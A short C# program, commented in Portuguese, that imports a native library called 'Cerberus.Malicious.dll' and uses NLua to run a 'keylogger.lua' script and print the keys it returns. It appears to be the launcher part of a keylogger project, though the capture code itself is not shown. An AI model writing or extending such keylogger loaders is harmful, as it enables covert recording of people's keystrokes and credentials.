using NLua;
using System.Runtime.InteropServices;

public class Program
{

    [DllImport("Cerberus.Malicious.dll", CallingConvention = CallingConvention.Cdecl)]
    public static extern int testMan();

    private static void Main(string[] args)
    {

        using (Lua lua = new Lua())
        {
            try
            {
                // Executa o script Lua
                lua.DoFile("scripts\\keylogger.lua");
                LuaFunction keylogger = lua["Keylogger"] as LuaFunction;
                // Recupera o resultado da execução do script Lua
                object[] result = keylogger.Call();

                LuaTable resultTable = result[0] as LuaTable;

                foreach(var key in resultTable.Values)
                {
                    Console.WriteLine(key);
                }

            }
            catch (Exception ex)
            {
                // Exibe qualquer erro que possa ocorrer
                Console.WriteLine("Erro: " + ex.Message);
            }
        }

    }
}